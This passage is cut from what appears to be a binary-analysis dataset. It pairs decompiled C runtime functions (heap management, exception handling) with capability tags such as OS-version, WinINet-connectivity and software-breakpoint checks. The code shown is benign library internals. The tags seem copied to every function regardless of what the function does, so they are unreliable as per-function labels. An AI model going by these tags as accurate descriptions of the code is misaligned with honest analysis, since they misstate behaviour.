        "decompiled_code": "\nvoid __cdecl fcn.0040d519(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n                    }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x452788 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x4527a0 * 0x8000 + (*0x452788)[3], 0x8000, 0x4000);\n                (*0x452788)[2] = (*0x452788)[2] | 0x80000000U >> (*0x4527a0 & 0x1f);\n                *((*0x452788)[4] + 0xc4 + *0x4527a0 * 4) = 0;\n                *((*0x452788)[4] + 0x43) = *((*0x452788)[4] + 0x43) + -1;\n                if (*((*0x452788)[4] + 0x43) == '\\0') {\n                    (*0x452788)[1] = (*0x452788)[1] & 0xfffffffe;\n                }\n                if ((*0x452788)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x452788)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4527a4, 0, (*0x452788)[4]);\n                    fcn.0040a2e0(*0x452788, *0x452788 + 5, (*0x45278c * 0x14 - *0x452788) + -0x14 + *0x452790);\n                    *0x45278c = *0x45278c + -1;\n                    if (*0x452788 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x452798 = *0x452790;\n                }\n            }\n            *0x452788 = arg_8h;\n            *0x4527a0 = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2146
    },
    "0040dccd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040dccd(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x452790 + *0x45278c * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x452798 < puVar10;\n    arg_8h = *0x452798;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x452790;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x452798 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x452798) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x452790;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x452798 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x452798) && (arg_8h = fcn.0040d831(),  arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.0040d8e8(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x452798 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x0040df86;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x0040df86:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x452788)) && (var_4h == *0x4527a0)) {\n        *0x452788 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2089
    },
    "0040dfe4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040dfe4(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x4511c0) {\n        do {\n            if (*(iVar12 * 4 + 0x4511c8) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x451208, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x4511c8) == uVar10) goto code_r0x0040e1df;\n                iVar12 = *0x4511c0 + -1;\n                if (iVar12 < 0) goto code_r0x0040e1cd;\n                goto code_r0x0040e1bd;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x4511c0);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x451208, 1);\n    iVar12 = *0x4511c0;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x4511c0;\n    if (0 < *0x4511c0) {\n        puVar8 = *0x4511c0 * 4 + 0x4511c4;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x4511c0 < 0x10) {\n            iVar7 = *0x4511c0;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x4511c8;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x4511c0 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x451208, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x0040e1bd:\n        if (*(iVar12 * 4 + 0x4511c8) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x0040e1cd:\n        if (*0x4511c0 < 0x10) {\n            *0x4511c0 = *0x4511c0 + 1;\n        }\n        iVar12 = *0x4511c0 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x0040e1f7;\ncode_r0x0040e1df:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x4511c8;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x0040e1f7:\n    (*pcVar3)(0x451208, 0);\n    return 1;\n}\n",
        "token_count": 1668
    },
    "0040e20d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040e20d(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    \n    iVar1 = *(unaff_ESI + 4);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != '\\0')) {\n        if ((iVar1 != *(unaff_EDI + 4)) && (iVar1 = fcn.0040ef40(iVar1 + 8, *(unaff_EDI + 4) + 8),  iVar1 != 0)) {\n            return 0;\n        }\n        if (((((*unaff_EDI & 2) != 0) && ((*unaff_ESI & 8) == 0)) || (((*param_1 & 1) != 0 && ((*unaff_ESI & 1) == 0))))\n           || (((*param_1 & 2) != 0 && ((*unaff_ESI & 2) == 0)))) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 245
    },
    "0040e27a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e27a(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443390, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    iVar5 = *(iVar1 + 8);\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar2 = fcn.0040eadd();\n    *(iVar2 + 0x84) = *(iVar2 + 0x84) + 1;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *(unaff_EBP + 0x10);\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar2 + 4) <= iVar5)) {\n            fcn.0040edb9();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar2 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar1 + 8) = iVar5;\n            fcn.0040edf0(*(*(iVar2 + 8) + 4 + iVar3), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040e32d();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040edb9();\n    }\n    *(iVar1 + 8) = iVar5;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 535
    },
    "0040e32d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040e32d(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    if (0 < *(iVar1 + 0x84)) {\n        iVar1 = fcn.0040eadd();\n        *(iVar1 + 0x84) = *(iVar1 + 0x84) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040e38d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e38d(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *param_1 + in_EAX;\n    if (-1 < param_1[1]) {\n        iVar1 = iVar1 + *(*(param_1[1] + in_EAX) + param_1[2]) + param_1[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 106
    },
    "0040e501": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0040e501(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x38);\n    fcn.0040a953(*(unaff_EBP + -0x3c));\n    iVar1 = fcn.0040eadd();\n    *(iVar1 + 0x7c) = *(unaff_EBP + -0x40);\n    iVar1 = fcn.0040eadd();\n    *(iVar1 + 0x80) = *(unaff_EBP + -0x44);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || (unaff_ESI[5] == 0x19930521)))) &&\n       ((*(unaff_EBP + -0x48) == 0 && (*(unaff_EBP + -0x20) != 0)))) {\n        iVar1 = fcn.0040a932(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040a146();\n            fcn.0040e348(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 359
    },
    "0040e570": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e570(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_ch_00;\n    uint uVar5;\n    uint8_t *extraout_ECX;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4433d0, 8);\n    puVar1 = *(unaff_EBP + 0xc);\n    iVar4 = *(unaff_EBP + 8);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && ((*(puVar1 + 3) & 0x80) == 0))))\n    goto code_r0x0040e6da;\n    uVar2 = *puVar1;\n    arg_8h_00 = extraout_EDX;\n    if (-1 < uVar2) {\n        arg_8h_00 = puVar1[2] + 0xc + extraout_EDX;\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = *(iVar4 + 0x18);\n    if ((uVar2 & 8) == 0) {\n        if ((*extraout_ECX & 1) == 0) {\n            if (*(extraout_ECX + 0x18) == 0) {\n                iVar4 = fcn.00413738(uVar5, 1);\n                if ((iVar4 == 0) || (iVar4 = fcn.00413754(arg_8h_00, 1),  iVar4 == 0)) {\ncode_r0x0040e6d1:\n                    fcn.0040edb9();\n                }\n                else {\n                    uVar5 = *(extraout_ECX + 0x14);\n                    arg_ch_00 = fcn.0040e38d();\n                    fcn.0040a2e0(arg_8h_00, arg_ch_00, uVar5);\n                }\n            }\n            else {\n                iVar4 = fcn.00413738(uVar5, 1);\n                if (((iVar4 == 0) || (iVar4 = fcn.00413754(arg_8h_00, 1),  iVar4 == 0)) ||\n                   (iVar4 = fcn.00413770(*(extraout_ECX + 0x18)),  iVar4 == 0)) goto code_r0x0040e6d1;\n                if ((*extraout_ECX & 4) == 0) {\n                    uVar5 = fcn.0040e38d();\n                    fcn.0040a64d(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n                else {\n                    uVar5 = fcn.0040e38d(1);\n                    fcn.0040a64d(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n            }\n        }\n        else {\n            iVar3 = fcn.00413738(uVar5, 1);\n            if ((iVar3 == 0) || (iVar3 = fcn.00413754(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0040e6d1;\n            fcn.0040a2e0(arg_8h_00, *(iVar4 + 0x18), *(extraout_ECX + 0x14));\n            if ((*(extraout_ECX + 0x14) == 4) && (*arg_8h_00 != 0)) goto code_r0x0040e5e9;\n        }\n    }\n    else {\n        iVar3 = fcn.00413738(uVar5, 1);\n        if ((iVar3 == 0) || (iVar3 = fcn.00413754(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0040e6d1;\n        *arg_8h_00 = *(iVar4 + 0x18);\ncode_r0x0040e5e9:\n        iVar4 = fcn.0040e38d();\n        *arg_8h_00 = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x0040e6da:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1061
    },
    "0040e6ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e6ec(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (in_ECX != 0) {\n        fcn.0040e570(arg_8h, unaff_EBX);\n    }\n    if (arg_1ch == 0) {\n        arg_1ch = unaff_ESI;\n    }\n    fcn.0040a654(arg_1ch, arg_8h);\n    fcn.0040e27a(unaff_ESI, arg_10h, arg_14h, *unaff_EDI);\n    *(unaff_ESI + 8) = unaff_EDI[1] + 1;\n    iVar1 = fcn.0040e3ac(arg_8h, unaff_ESI, arg_ch, arg_14h, arg_18h, 0x100);\n    if (iVar1 != 0) {\n        fcn.0040a61d(iVar1);\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0040e753": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0040e753(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_00000024;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*arg_8h != -0x7ffffffd) &&\n       (((iVar1 = fcn.0040eadd(),  *(iVar1 + 0x74) == 0 ||\n         (iVar1 = fcn.0040a717(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h, unaff_ESI, var_8h, var_4h, \n                               unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                               arg_24h, in_stack_00000024),  iVar1 == 0)) &&\n        